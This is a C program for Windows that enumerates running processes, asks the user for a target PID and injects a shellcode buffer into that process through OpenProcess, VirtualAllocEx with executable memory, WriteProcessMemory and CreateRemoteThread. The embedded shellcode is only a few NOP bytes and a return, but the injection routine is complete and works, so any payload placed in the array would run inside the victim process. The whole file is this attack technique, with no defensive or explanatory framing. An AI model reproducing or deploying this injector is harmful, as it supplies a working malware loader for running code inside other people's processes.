#include <windows.h>
#include <stdio.h>
#include <psapi.h>

#define ARRAY_SIZE 1024

unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 
    0xC3              
};

int inject_shellcode(DWORD processID) {
    HANDLE hProcess;
    LPVOID remoteMemory;
    SIZE_T shellcodeSize = sizeof(shellcode);
    HANDLE hThread;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (hProcess == NULL) {
        printf("Failed to open process with PID %u. Error: %u\n", processID, GetLastError());
        return 1;
    }

    remoteMemory = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (remoteMemory == NULL) {
        printf("Failed to allocate memory in the process. Error: %u\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    if (!WriteProcessMemory(hProcess, remoteMemory, shellcode, shellcodeSize, NULL)) {
        printf("Failed to write shellcode to the process. Error: %u\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread. Error: %u\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    printf("Shellcode successfully injected into process ID %u.\n", processID);

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}

int main(void) {
    DWORD processIDs[ARRAY_SIZE], bytesReturned, processCount;
    unsigned int i;
    DWORD targetPID;

    if (!EnumProcesses(processIDs, sizeof(processIDs), &bytesReturned)) {
        printf("Failed to enumerate processes.\n");
        return 1;
    }

    processCount = bytesReturned / sizeof(DWORD);

    printf("Process IDs of running processes:\n");
    for (i = 0; i < processCount; i++) {
        if (processIDs[i] != 0) {
            printf("Process ID: %u\n", processIDs[i]);
        }
    }

    printf("\nEnter the Process ID (PID) of the target process for shellcode injection: ");
    scanf("%u", &targetPID);

    if (inject_shellcode(targetPID) != 0) {
        printf("Shellcode injection failed.\n");
        return 1;
    }

    return 0;
}
